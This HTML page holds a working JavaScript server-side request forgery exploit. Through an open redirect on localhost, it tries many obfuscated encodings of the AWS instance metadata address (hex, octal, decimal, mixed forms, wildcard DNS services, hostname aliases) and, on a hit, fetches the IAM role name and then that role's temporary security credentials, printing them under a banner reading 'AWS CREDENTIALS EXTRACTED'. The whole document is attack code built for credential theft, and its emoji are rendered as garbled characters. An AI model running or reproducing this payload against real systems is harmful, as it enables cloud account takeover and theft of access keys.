<!DOCTYPE html>
<html>
<head>
    <title>AWS Metadata IP Bypass</title>
</head>
<body>
    <h1>‚òÅÔ∏è AWS Metadata Service IP Bypass</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Alternative representations of 169.254.169.254 (AWS metadata IP)
        var metadataIPs = [
            // Standard
            '169.254.169.254',
            
            // Hex representations of 169.254.169.254
            '0xa9.0xfe.0xa9.0xfe',
            '0xa9fea9fe',           // Full hex
            
            // Octal representations
            '0251.0376.0251.0376',   // Full octal
            
            // Decimal representation  
            '2852039166',            // 169.254.169.254 as decimal
            
            // Mixed representations
            '169.254.169.0xfe',      // Mixed decimal/hex
            '169.0376.169.254',      // Mixed decimal/octal
            
            // Alternative formats
            '169.254.169.254.xip.io',
            '169.254.169.254.nip.io',
            
            // URL encoding bypass attempts
            'http%3A%2F%2F169.254.169.254',
            
            // Try if it responds to different hostnames
            'metadata',
            'metadata.amazonaws.com',
            'instance-data',
            'ec2metadata'
        ];
        
        for(var i = 0; i < metadataIPs.length; i++) {
            try {
                results += "<h3>üîç Testing AWS Metadata: " + metadataIPs[i] + "</h3>";
                
                // Test metadata root
                var xhr1 = new XMLHttpRequest();
                xhr1.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/', false);
                xhr1.send();
                
                if(xhr1.responseText && xhr1.responseText.trim().length > 0) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>üéØ METADATA ACCESS: " + metadataIPs[i] + " (" + xhr1.responseText.length + " bytes)</div>";
                    results += "<div style='background:#f0f0f0;padding:10px;font-size:11px;'>" + xhr1.responseText + "</div>";
                    
                    // If metadata root works, try IAM credentials immediately
                    try {
                        var xhr2 = new XMLHttpRequest();
                        xhr2.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/iam/security-credentials/', false);
                        xhr2.send();
                        
                        if(xhr2.responseText && xhr2.responseText.trim().length > 0) {
                            results += "<div style='background:#74c0fc;padding:8px;'>üîë IAM ROLE FOUND: " + xhr2.responseText + "</div>";
                            
                            // Get the actual credentials
                            var roleName = xhr2.responseText.trim();
                            var xhr3 = new XMLHttpRequest();
                            xhr3.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/iam/security-credentials/' + roleName, false);
                            xhr3.send();
                            
                            results += "<div style='background:#ff6b6b;color:white;padding:10px;border:3px solid red;'>üö® AWS CREDENTIALS EXTRACTED! üö®</div>";
                            results += "<div style='background:#f0f0f0;padding:10px;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr3.responseText + "</div>";
                        }
                    } catch(e2) {
                        results += "<div style='background:#ffeaa7;padding:3px;'>‚ö†Ô∏è IAM access failed</div>";
                    }
                    
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No metadata response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå Failed: " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
